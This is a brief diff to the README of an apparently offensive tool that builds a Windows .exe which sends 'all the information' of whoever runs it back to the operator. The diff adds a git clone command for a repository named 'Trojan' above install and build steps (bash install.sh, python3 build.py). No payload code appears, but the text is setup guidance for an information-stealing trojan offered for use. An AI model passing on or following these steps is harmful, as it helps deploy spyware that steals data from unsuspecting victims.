@@ -16,6 +16,7 @@ This tool is will create a .exe file which will send you all the information of 
 3. If you are using Windows then it will be easier to create .exe file
 
 # Usage
+> git clone https://github.com/Cyber-Dioxide/Trojan
 _For Linux
 * bash install.sh
 * python3 build.py
